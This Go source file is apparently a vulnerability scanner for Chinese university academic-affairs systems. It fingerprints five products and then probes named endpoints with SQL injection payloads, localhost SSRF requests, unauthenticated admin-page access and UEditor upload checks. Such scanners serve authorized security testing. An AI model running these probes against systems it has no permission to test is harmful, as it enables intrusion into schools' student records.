package edu

import (
	"fmt"
	"net/url"

	"github.com/kunlun-sec/lunying/pkg/utils"
)

type EduPOCScanner struct {
	target  string
	results []EduPOCResult
}

type EduPOCResult struct {
	SystemType  string
	VulnType    string
	Severity    string
	URL         string
	Evidence    string
	Payload     string
	Description string
	Confirmed   bool
}

func NewEduPOCScanner(target string) *EduPOCScanner {
	if !utils.HasProtocol(target) {
		target = "http://" + target
	}
	return &EduPOCScanner{
		target:  target,
		results: []EduPOCResult{},
	}
}

func (eps *EduPOCScanner) Scan() ([]EduPOCResult, error) {
	fmt.Println("🔍 开始教务系统专项扫描...")

	eps.scanZFSoft()
	eps.scanQZSoft()
	eps.scanKingo()
	eps.scanURP()
	eps.scanJWGL()

	fmt.Printf("✅ 教务系统扫描完成，发现 %d 个漏洞\n", len(eps.results))
	return eps.results, nil
}

func (eps *EduPOCScanner) ScanAll() ([]EduPOCResult, error) {
	return eps.Scan()
}

func (eps *EduPOCScanner) scanZFSoft() {
	fingerprints := []string{"正方", "zfsoft", "jwglxt", "jsxsd"}
	detectionPaths := []string{"/jwglxt", "/jsxsd", "/xsxk", "/"}

	var detected bool
	for _, path := range detectionPaths {
		body, _ := utils.FetchBody(eps.target+path, 512*1024)
		if utils.ContainsAny(body, fingerprints) {
			fmt.Printf("✅ 发现正方教务系统: %s\n", eps.target+path)
			detected = true
			break
		}
	}
	if !detected {
		return
	}

	sqlPaths := []struct {
		path    string
		payload string
	}{
		{"/jwglxt/kjgl/kjgl_queryBySql?sql=", "' OR '1'='1"},
		{"/jsxsd/xsxk/xsxk_index?jx0502zbid=", "'"},
	}
	sqlErrors := []string{
		"SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
		"Unclosed quotation", "JDBC", "java.sql", "SQLiteException",
		"Warning: mysql", "supplied argument is not a valid MySQL",
	}
	for _, sp := range sqlPaths {
		testURL := eps.target + sp.path + url.QueryEscape(sp.payload)
		body, code := utils.FetchBody(testURL, 512*1024)
		if code == 200 && utils.ContainsAny(body, sqlErrors) {
			eps.results = append(eps.results, EduPOCResult{
				SystemType:  "正方教务系统",
				VulnType:    "SQL注入",
				Severity:    utils.SeverityCritical,
				URL:         testURL,
				Evidence:    utils.ExtractSnippet(body, sqlErrors, 30, 80),
				Payload:     sp.payload,
				Description: "正方教务系统存在SQL注入漏洞，攻击者可读取数据库敏感信息",
				Confirmed:   true,
			})
			fmt.Printf("⚠️  [已确认] SQL注入: %s\n", testURL)
		}
	}

	unauthPaths := []struct {
		path      string
		badWords  []string
		goodWords []string
	}{
		{
			"/jwglxt/xtgl/init_cxAreaOrProvince.html",
			[]string{"login", "登录", "password"},
			[]string{"province", "area", "{", "["},
		},
		{
			"/jsxsd/framework/jslib/",
			[]string{"login", "登录"},
			[]string{"Index of", "jquery", ".js"},
		},
	}
	for _, up := range unauthPaths {
		testURL := eps.target + up.path
		body, code := utils.FetchBody(testURL, 512*1024)
		if code == 200 && !utils.ContainsAny(body, up.badWords) && utils.ContainsAny(body, up.goodWords) {
			eps.results = append(eps.results, EduPOCResult{
				SystemType:  "正方教务系统",
				VulnType:    "未授权访问",
				Severity:    utils.SeverityHigh,
				URL:         testURL,
				Evidence:    "未经登录即可访问功能页面，响应包含预期内容",
				Description: "正方教务系统存在未授权访问漏洞",
				Confirmed:   true,
			})
			fmt.Printf("⚠️  [已确认] 未授权访问: %s\n", testURL)
		}
	}
}

func (eps *EduPOCScanner) scanQZSoft() {
	fingerprints := []string{"强智", "qzsoft", "qdjy"}
	detectionPaths := []string{"/qzsoft", "/qz", "/"}

	var detected bool
	for _, path := range detectionPaths {
		body, _ := utils.FetchBody(eps.target+path, 512*1024)
		if utils.ContainsAny(body, fingerprints) {
			fmt.Printf("✅ 发现强智教务系统: %s\n", eps.target+path)
			detected = true
			break
		}
	}
	if !detected {
		return
	}

	ssrfPaths := []string{
		"/qzsoft/proxy?url=http://127.0.0.1",
		"/qzsoft/proxy?url=http://localhost",
	}
	ssrfIndicators := []string{"127.0.0.1", "localhost", "Connection refused", "ECONNREFUSED", "open tcp"}
	for _, sp := range ssrfPaths {
		body, code := utils.FetchBody(eps.target+sp, 512*1024)
		if code == 200 && utils.ContainsAny(body, ssrfIndicators) {
			eps.results = append(eps.results, EduPOCResult{
				SystemType:  "强智教务系统",
				VulnType:    "SSRF",
				Severity:    utils.SeverityHigh,
				URL:         eps.target + sp,
				Evidence:    utils.ExtractSnippet(body, ssrfIndicators, 30, 80),
				Description: "强智教务系统proxy接口存在SSRF漏洞，可探测内网服务",
				Confirmed:   true,
			})
			fmt.Printf("⚠️  [已确认] SSRF: %s\n", eps.target+sp)
		}
	}

	adminURL := eps.target + "/qzsoft/admin"
	body, code := utils.FetchBody(adminURL, 512*1024)
	adminIndicators := []string{"管理", "admin", "dashboard", "用户管理", "系统设置"}
	loginIndicators := []string{"login", "登录", "password", "密码", "signin"}
	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "强智教务系统",
			VulnType:    "后台未授权访问",
			Severity:    utils.SeverityCritical,
			URL:         adminURL,
			Evidence:    "直接访问后台页面无需认证，页面包含管理功能",
			Description: "强智教务系统后台存在未授权访问漏洞",
			Confirmed:   true,
		})
		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
	}
}

func (eps *EduPOCScanner) scanKingo() {
	fingerprints := []string{"金智", "kingo", "kingosoft"}
	detectionPaths := []string{"/kingo", "/"}

	var detected bool
	for _, path := range detectionPaths {
		body, _ := utils.FetchBody(eps.target+path, 512*1024)
		if utils.ContainsAny(body, fingerprints) {
			fmt.Printf("✅ 发现金智教务系统: %s\n", eps.target+path)
			detected = true
			break
		}
	}
	if !detected {
		return
	}

	adminURL := eps.target + "/kingo/admin"
	body, code := utils.FetchBody(adminURL, 512*1024)
	adminIndicators := []string{"管理", "admin", "dashboard", "系统"}
	loginIndicators := []string{"login", "登录", "password"}
	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "金智教务系统",
			VulnType:    "后台未授权访问",
			Severity:    utils.SeverityCritical,
			URL:         adminURL,
			Evidence:    "直接访问后台无需认证",
			Description: "金智教务系统后台存在未授权访问漏洞",
			Confirmed:   true,
		})
		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
	}

	ueditorURL := eps.target + "/kingo/ueditor/controller.php?action=catchimage"
	body, code = utils.FetchBody(ueditorURL, 512*1024)
	if code == 200 && utils.ContainsAny(body, []string{"state", "url", "ERROR"}) {
		snippet := body
		if len(snippet) > 100 {
			snippet = snippet[:100]
		}
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "金智教务系统",
			VulnType:    "文件上传（UEditor）",
			Severity:    utils.SeverityHigh,
			URL:         ueditorURL,
			Evidence:    "UEditor接口可访问，返回：" + snippet,
			Description: "金智教务系统UEditor存在文件上传漏洞风险，需进一步验证",
			Confirmed:   false,
		})
		fmt.Printf("⚠️  [待验证] UEditor文件上传: %s\n", ueditorURL)
	}
}

func (eps *EduPOCScanner) scanURP() {
	fingerprints := []string{"URP", "urp", "RunQian", "runqian"}
	detectionPaths := []string{"/urp", "/"}

	var detected bool
	for _, path := range detectionPaths {
		body, _ := utils.FetchBody(eps.target+path, 512*1024)
		if utils.ContainsAny(body, fingerprints) {
			fmt.Printf("✅ 发现URP教务系统: %s\n", eps.target+path)
			detected = true
			break
		}
	}
	if !detected {
		return
	}

	servletURL := eps.target + "/urp/servlet/com.runqian.report.view.ReportServlet"
	body, code := utils.FetchBody(servletURL, 512*1024)
	servletIndicators := []string{"report", "runqian", "data", "{", "xml", "html"}
	loginIndicators := []string{"login", "登录", "password"}
	if code == 200 && utils.ContainsAny(body, servletIndicators) && !utils.ContainsAny(body, loginIndicators) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "URP教务系统",
			VulnType:    "未授权访问",
			Severity:    utils.SeverityHigh,
			URL:         servletURL,
			Evidence:    "Servlet接口无需认证可访问",
			Description: "URP教务系统Servlet接口存在未授权访问",
			Confirmed:   true,
		})
		fmt.Printf("⚠️  [已确认] Servlet未授权: %s\n", servletURL)
	}

	sqlURL := eps.target + "/urp/servlet/com.runqian.report.view.Servlet?report='"
	body, code = utils.FetchBody(sqlURL, 512*1024)
	sqlErrors := []string{"SQL syntax", "ORA-", "java.sql", "JDBC", "Exception"}
	if code == 200 && utils.ContainsAny(body, sqlErrors) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "URP教务系统",
			VulnType:    "SQL注入",
			Severity:    utils.SeverityCritical,
			URL:         sqlURL,
			Evidence:    utils.ExtractSnippet(body, sqlErrors, 30, 80),
			Payload:     "'",
			Description: "URP教务系统报表接口存在SQL注入漏洞",
			Confirmed:   true,
		})
		fmt.Printf("⚠️  [已确认] SQL注入: %s\n", sqlURL)
	}
}

func (eps *EduPOCScanner) scanJWGL() {
	fingerprints := []string{"青果", "jwgl", "qinguo"}
	detectionPaths := []string{"/jwgl", "/"}

	var detected bool
	for _, path := range detectionPaths {
		body, _ := utils.FetchBody(eps.target+path, 512*1024)
		if utils.ContainsAny(body, fingerprints) {
			fmt.Printf("✅ 发现青果教务系统: %s\n", eps.target+path)
			detected = true
			break
		}
	}
	if !detected {
		return
	}

	adminURL := eps.target + "/jwgl/admin"
	body, code := utils.FetchBody(adminURL, 512*1024)
	adminIndicators := []string{"管理", "admin", "dashboard"}
	loginIndicators := []string{"login", "登录", "password"}
	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "青果教务系统",
			VulnType:    "后台未授权访问",
			Severity:    utils.SeverityCritical,
			URL:         adminURL,
			Evidence:    "直接访问后台无需认证",
			Description: "青果教务系统后台存在未授权访问漏洞",
			Confirmed:   true,
		})
		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
	}

	ueditorURL := eps.target + "/jwgl/ueditor/controller.php?action=catchimage"
	body, code = utils.FetchBody(ueditorURL, 512*1024)
	if code == 200 && utils.ContainsAny(body, []string{"state", "url", "ERROR"}) {
		eps.results = append(eps.results, EduPOCResult{
			SystemType:  "青果教务系统",
			VulnType:    "文件上传（UEditor）",
			Severity:    utils.SeverityHigh,
			URL:         ueditorURL,
			Evidence:    "UEditor接口可访问",
			Description: "青果教务系统UEditor存在文件上传风险，需手工验证",
			Confirmed:   false,
		})
		fmt.Printf("⚠️  [待验证] UEditor: %s\n", ueditorURL)
	}
}

func (eps *EduPOCScanner) GetResults() []EduPOCResult {
	return eps.results
}